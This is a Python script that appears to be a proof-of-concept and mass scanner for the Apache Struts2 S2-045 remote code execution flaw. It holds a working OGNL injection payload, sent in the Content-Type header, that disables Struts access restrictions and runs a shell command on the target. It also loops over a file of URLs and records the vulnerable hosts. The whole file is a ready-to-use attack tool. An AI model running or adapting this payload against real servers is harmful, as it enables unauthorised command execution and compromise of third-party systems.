#!/usr/bin/python
# -*- coding: utf-8 -*-
import requests
import sys
import loggerlast
def poc(url):
    #payload = "%{(#test=‘multipart/form-data‘).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[‘com.opensymphony.xwork2.ActionContext.container‘]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println(102*102*102*99)).(#ros.flush())}"
    header = {}
    header["User-Agent"]="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
    #header["Content-Type"] = payload
    header["Content-Type"] = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo s2-045').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
    r = requests.get(url, headers=header,timeout=3)
    content = r.content
    r.close()
    if 's2-045' in content:
        return True
    return False


def isOrNot(url):
    try:
        if poc(url):
            print ('VULNERABLE')
            return 0 
        else:
            print ('NOT VULNERABLE')
            return 1 
    except Exception as e:
       loggerlast.log.warning(url+'\n'+str(e))
       return 2

def checkURL(path):
    urls = open(path)
    eurl = open('exceptUrl.txt','a')
    vul = open('vulnerable.txt','a')
    for line in urls:
        if line.strip() == '':
            continue
        try:
            if(line[0:5] == 'url-:'):
                flag = isOrNot(line[5:-1])
                if flag == 0:
                    vul.write(line[5:-1]+'\n')
                if flag == 2:
                    eurl.write(line[5:-1]+'\n')
            elif (line[0:10] == 'VULNERABLE'):
                vul.write(line[12:-1]+'\n')
            else:
                continue
        except Exception as e:
            print("checkurl warning:"+str(e))
    urls.close()
    eurl.close()
    vul.close()
if __name__ == '__main__':
    if len(sys.argv) == 2:
        checkURL(sys.argv[1])
        
    else:
        while 1:
            try:
                path = raw_input('Input urlFile Path >>')
                if path=='q':
                    sys.exit();
                else:
                    loggerlast.log.info("url File Path: "+path)
                    checkURL(path) 
            except Exception as e:
                 print("main warning:"+str(e))






